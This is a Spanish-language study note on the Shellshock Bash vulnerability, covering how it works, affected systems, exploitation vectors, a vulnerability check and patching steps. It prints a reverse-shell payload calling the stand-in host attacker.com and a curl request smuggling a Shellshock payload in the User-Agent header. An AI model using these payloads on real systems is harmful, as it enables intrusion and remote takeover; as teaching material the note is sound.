---
title: "Shellshock"
date: 2026-01-26
tags:
  - ciberseguridad
  - herramientas
---
### **Shellshock: La Vulnerabilidad de Bash**


> **Relacionado**: [[01-Ciberseguridad/Herramientas/IDOR|IDOR]]. [[01-Ciberseguridad/Herramientas/IDS-IPS/SNORT|SNORT]]. [[01-Ciberseguridad/Redes-Protocolos/PROTOCOLOS-DE-INTERNET/DHCP|DHCP]]. [[02-Ciencias-Computacion/Redes/Herramientas|Herramientas]]. [[06-Infraestructura/Servidores/DispositivosOT/CENT|CENT]].

**Shellshock** es una vulnerabilidad crítica descubierta en **Bash (Bourne Again Shell)** en **septiembre de 2014**. Afecta a millones de sistemas basados en Unix/Linux y permite la **ejecución remota de código (RCE - Remote Code Execution)** en servidores y dispositivos que usan Bash como intérprete de comandos.

---

## **1. ¿Qué es Shellshock?**

Shellshock es una vulnerabilidad en la manera en que **Bash maneja variables de entorno**. Un atacante puede inyectar código malicioso dentro de una variable de entorno y forzar su ejecución cuando Bash procesa la variable. Esto permite ejecutar comandos arbitrarios en el sistema, obteniendo acceso remoto no autorizado.

---

## **2. ¿Cómo Funciona Shellshock?**

Cuando Bash recibe una variable de entorno con un código de función, lo interpreta y lo ejecuta al abrir una nueva sesión de Bash.

Ejemplo de explotación:

```bash
env x='() { :; }; echo VULNERABLE' bash -c "echo test"
```

Si el sistema es vulnerable, imprimirá:

```
VULNERABLE
test
```

El problema es que un atacante puede reemplazar `"echo VULNERABLE"` con comandos peligrosos como:

```bash
env x='() { :; }; /bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1' bash -c "echo test"
```

Este comando crea una **shell inversa** conectada al servidor del atacante, dándole control del sistema.

---

## **3. Sistemas Afectados**

Shellshock afecta a cualquier sistema que utilice versiones vulnerables de Bash, incluyendo:

- **Linux (Debian, Ubuntu, CentOS, Red Hat, etc.)**
- **macOS** (Versiones antiguas)
- **Servidores web Apache con CGI**
- **Dispositivos IoT y routers que usen Bash**

---

## **4. Métodos de Explotación**

Shellshock se puede explotar en múltiples contextos:

1. **A través de CGI en servidores web**
    
    - Si un servidor Apache usa Bash en scripts CGI, un atacante puede enviar cabeceras HTTP maliciosas como:
        
        ```bash
        curl -H "User-Agent: () { :; }; /bin/bash -c 'id'" http://victima.com/cgi-bin/vulnerable.sh
        ```
        
    - Si el servidor es vulnerable, ejecutará el comando `id`, revelando información sobre el usuario del sistema.
2. **A través de DHCP**
    
    - Un servidor malicioso puede enviar paquetes DHCP con un payload que ejecute comandos arbitrarios en clientes Linux/macOS.
3. **A través de SSH**
    
    - Si un usuario con acceso limitado ejecuta comandos a través de SSH, podría intentar explotar la vulnerabilidad para escalar privilegios.

---

## **5. Cómo Comprobar si un Sistema es Vulnerable**

Ejecuta el siguiente comando en Bash:

```bash
env x='() { :; }; echo VULNERABLE' bash -c "echo prueba"
```

Si devuelve "VULNERABLE", el sistema está en riesgo.

Para versiones específicas de Bash:

```bash
bash --version
```

Si la versión es **anterior a 4.3**, es posible que sea vulnerable.

---

## **6. Cómo Mitigar y Proteger un Sistema**

1. **Actualizar Bash**
    
    - En Debian/Ubuntu:
        
        ```bash
        sudo apt update && sudo apt upgrade bash -y
        ```
        
    - En Red Hat/CentOS:
        
        ```bash
        sudo yum update bash -y
        ```
        
2. **Filtrar cabeceras sospechosas en servidores web**
    
    - Configurar reglas en **mod_security** para bloquear cadenas maliciosas.
3. **Deshabilitar scripts CGI que usen Bash**
    
    - Usar alternativas como `dash` o `sh` en lugar de Bash.
4. **Monitorizar tráfico y logs**
    
    - Usar herramientas como Snort para detectar intentos de explotación.

---

## **7. Impacto y Consecuencias de Shellshock**

- **Facilita la toma de control de servidores web, IoT y sistemas embebidos**.
- **Permite la escalada de privilegios en sistemas multiusuario**.
- **Es explotable con solo enviar un paquete malicioso, sin autenticación previa**.
- **Se han registrado botnets como "wopbot" que explotaron Shellshock para lanzar ataques DDoS**.

Shellshock se considera **una de las vulnerabilidades más graves en la historia de Linux**, comparable a **Heartbleed** en términos de impacto.

---

## **8. Conclusión**

Shellshock demuestra cómo un error en la interpretación de variables de entorno en Bash puede convertirse en una vulnerabilidad crítica de seguridad. Aunque ha sido parchado en versiones modernas, sigue siendo un riesgo en sistemas desactualizados, dispositivos IoT y servidores web mal configurados.

Actualizar Bash y aplicar medidas de seguridad adicionales sigue siendo clave para prevenir ataques basados en Shellshock.